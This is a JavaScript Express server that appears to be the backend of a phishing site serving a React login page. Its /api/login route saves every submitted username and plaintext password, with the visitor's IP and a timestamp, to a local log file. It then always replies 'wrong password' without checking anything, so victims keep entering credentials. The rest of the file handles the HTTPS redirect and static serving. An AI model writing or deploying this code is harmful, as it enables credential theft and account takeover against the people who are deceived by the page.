const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const http = require('http');
const https = require('https');
const path = require('path');
require('dotenv').config(); // Load environment variables

const app = express();

app.use(cors());
app.use(bodyParser.json());

// Middleware to redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.secure) {
    // Request is secure, continue to next middleware
    return next();
  }
  // Request is not secure, redirect to HTTPS
  res.redirect(`https://${req.headers.host}${req.url}`);
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `${new Date().toISOString()} IP: ${req.ip}, Username: ${username}, Password: ${password}\n`;
  fs.appendFile('login_attempts.log', logEntry, (err) => {
    if (err) {
      console.error('Failed to record login attempt:', err);
      return res.status(500).send('Server error');
    }
    res.status(200).json({ message: 'wrong password' })
  });
});


if (process.env.NODE_ENV === 'production') {
  // Serve static files from the React app in production
  const buildPath = path.join(__dirname, '../frontend/dist');
  app.use(express.static(buildPath));
// Catch all other routes and return the index file
app.get('/', (req, res) => {
  res.sendFile(path.join(buildPath, 'index.html'));
});
}
else {
  // In development mode, redirect to the React dev server
  app.get('/', (req, res) => {
    res.redirect(`http://localhost:5173${req.path}`);
  });
}


const httpPort = process.env.HTTP_PORT || 80;
const httpsPort = process.env.HTTPS_PORT || 443;

const sslOptions = {
  key: fs.readFileSync(process.env.SSL_KEY_PATH),
  cert: fs.readFileSync(process.env.SSL_CERT_PATH)
};

http.createServer(app).listen(httpPort, () => {
  console.log(`HTTP Server is running on port ${httpPort}`);
});

https.createServer(sslOptions, app).listen(httpsPort, () => {
  console.log(`HTTPS Server is running on port ${httpsPort}`);
});